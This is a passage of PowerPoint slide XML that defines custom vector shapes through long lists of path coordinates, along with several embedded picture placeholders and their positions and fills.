                  <a:lnTo>
                    <a:pt x="308229" y="334022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298323" y="321487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="287870" y="292595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="289217" y="261581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="301294" y="234353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="323011" y="214972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="353288" y="208470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="390499" y="220129"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411759" y="233883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422579" y="243471"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="432485" y="252564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="432485" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433387" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="254177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434492" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="461962" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="461962" y="254177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="494004" y="254177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="519531" y="258495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527799" y="265430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="532485" y="274116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="532485" y="228917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="511327" y="220560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="217906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="170091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527799" y="170091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563295" y="203720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595744" y="221361"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="651167" y="217512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="682345" y="189014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="687539" y="180809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="690511" y="176123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="702703" y="147193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="710082" y="11563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39" name="object 10"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId6"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2202480" y="3047040"/>
              <a:ext cx="230040" cy="217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0" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2461680" y="3040560"/>
              <a:ext cx="46800" cy="1576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46989" h="158114" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="23809" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="157095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46784" y="157894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2380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1" name="object 12"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId7"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4335480" y="2838600"/>
              <a:ext cx="115560" cy="118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2" name="object 13"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId8"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3890880" y="2664000"/>
              <a:ext cx="115560" cy="72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3" name="object 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3851280" y="2664000"/>
              <a:ext cx="599760" cy="287280"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 599760"/>
                <a:gd name="textAreaRight" fmla="*/ 600120 w 59976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600075" h="287655" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="4751" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="282576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167292" y="287338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171846" y="177999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="596511" y="173236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="600075" y="117872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170855" y="115491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168479" y="1389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118192" y="3770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113639" y="233164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60977" y="232172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58601" y="56753"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56225" y="2381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4751" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FF26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4" name="object 15"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId9"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3879720" y="2671920"/>
              <a:ext cx="140760" cy="252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5" name="object 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3857760" y="2811600"/>
              <a:ext cx="592200" cy="135000"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 592200"/>
                <a:gd name="textAreaRight" fmla="*/ 592560 w 59220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592454" h="135255" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="592137" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="136968" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136968" y="112777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24415" y="111589"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="131573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162971" y="134936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167537" y="27105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="585189" y="27105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="592137" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FF26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6" name="object 17"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3838680" y="2654280"/>
              <a:ext cx="652320" cy="312120"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 652320"/>
                <a:gd name="textAreaRight" fmla="*/ 652680 w 652320"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 312120"/>
                <a:gd name="textAreaBottom" fmla="*/ 312480 h 312120"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="652779" h="312419" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="141287" y="57150"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="113169" y="57150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="85725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85255" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85255" y="85725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="85725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="57150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85255" y="57150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="57150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="85725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="255270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="255270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="85725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="57150"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="652779" h="312419" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="652462" y="156552"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="623887" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="27940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862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0" y="170180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="312420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="312420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="198450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="511175" y="198450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="511175" y="169875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198285" y="169875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="169875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170078" y="170180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170078" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28346" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28346" y="170180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28346" y="27940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="27940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="142608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="142875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="142875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="142608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595503" y="142608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595503" y="170903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="538949" y="170903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="538949" y="198996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595503" y="198996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595503" y="227291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="510578" y="227291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="510578" y="255600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="623887" y="255600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="623887" y="198996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="652462" y="15655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47" name="object 18"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId10"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4321080" y="2824200"/>
              <a:ext cx="140760" cy="142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8" name="object 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2925360" y="3029040"/>
              <a:ext cx="1370520" cy="655560"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1370520"/>
                <a:gd name="textAreaRight" fmla="*/ 1370880 w 1370520"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 655560"/>
                <a:gd name="textAreaBottom" fmla="*/ 655920 h 655560"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1370964" h="655954" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1370401" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1353732" y="18256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1333888" y="40481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1288644" y="96837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1235463" y="164306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174344" y="237331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1105288" y="311943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1031469" y="383381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950507" y="446087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="865576" y="495299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="818744" y="515143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="767944" y="532606"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="653644" y="562768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="529026" y="586581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="401232" y="605631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275026" y="621506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156757" y="634999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103576" y="641349"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54363" y="647699"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9913" y="654049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="655702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9" name="object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2897280" y="2285640"/>
              <a:ext cx="589680" cy="1450440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 589680"/>
                <a:gd name="textAreaRight" fmla="*/ 590040 w 589680"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1450440"/>
                <a:gd name="textAreaBottom" fmla="*/ 1450800 h 1450440"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="152666" y="1450594"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="84556" y="1389532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129184" y="1309674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1403616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152666" y="1450594"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="191135" y="38188"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="177914" y="19113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="177914" y="37592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="177901" y="38188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="166281" y="51650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="166116" y="51650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="161798" y="51396"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159804" y="50952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158534" y="50406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158534" y="71158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143027" y="88506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="139230" y="88506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135648" y="87566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135496" y="87566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129743" y="84670"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="126174" y="82397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113753" y="73444"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="133578" y="45935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158445" y="70688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158534" y="71158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158534" y="50406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156400" y="49466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154000" y="47967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="151180" y="45935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="139598" y="37592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155270" y="15849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="177914" y="37592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="177914" y="19113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176720" y="18161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173507" y="15849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="151511" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97523" y="74891"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124091" y="94043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128574" y="96583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136347" y="99377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140500" y="99987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148615" y="99669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170014" y="78828"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169913" y="74891"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169799" y="70688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169748" y="68897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167894" y="64198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164350" y="59842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164604" y="59385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169037" y="60159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173177" y="59842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="174396" y="59385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="180898" y="56959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190258" y="44627"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="191135" y="38188"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="233299" y="96583"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="232511" y="88506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232143" y="87858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228307" y="81495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="225894" y="79768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222275" y="77165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222275" y="103352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="219824" y="109448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209461" y="123812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204279" y="128193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="193852" y="131457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188810" y="130530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179044" y="123494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176568" y="118948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176593" y="107581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204812" y="79768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222275" y="103352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222275" y="77165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220726" y="76034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="214998" y="72644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209296" y="70688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="209715" y="70688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="203073" y="69977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196888" y="70688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190779" y="72796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165531" y="107581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165620" y="117805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165989" y="122567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170218" y="129641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178028" y="135280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183972" y="138798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184111" y="138798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="189636" y="140728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="195643" y="141389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201434" y="140728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201663" y="140728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="207200" y="138798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="207479" y="138798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213563" y="135102"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="217639" y="131457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="219151" y="130111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="224332" y="123812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228765" y="116763"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="231711" y="109969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="233235" y="103352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="233299" y="96583"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="291744" y="138798"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="291731" y="131089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="288544" y="124929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="285851" y="122986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280098" y="118859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280098" y="135102"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279234" y="144716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250736" y="172110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245694" y="171069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="230670" y="155409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="253822" y="123291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257314" y="122986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="262826" y="123291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="261391" y="123291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267855" y="124561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270916" y="125844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277418" y="130530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278091" y="131089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280098" y="135102"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280098" y="118859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278650" y="117805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274980" y="116217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269468" y="115341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267360" y="115011"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="262648" y="115011"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259549" y="115341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279577" y="87566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280149" y="87566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270294" y="80467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213855" y="158762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222719" y="165150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="225221" y="162966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="226428" y="165760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250850" y="183527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259359" y="181165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="289318" y="150850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="291134" y="144716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="291744" y="138798"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="589914" h="1450975" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="346011" y="128663"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="333527" y="119659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="324535" y="132143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330974" y="136779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="313639" y="143852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="318477" y="147332"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="337007" y="141135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346011" y="128663"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
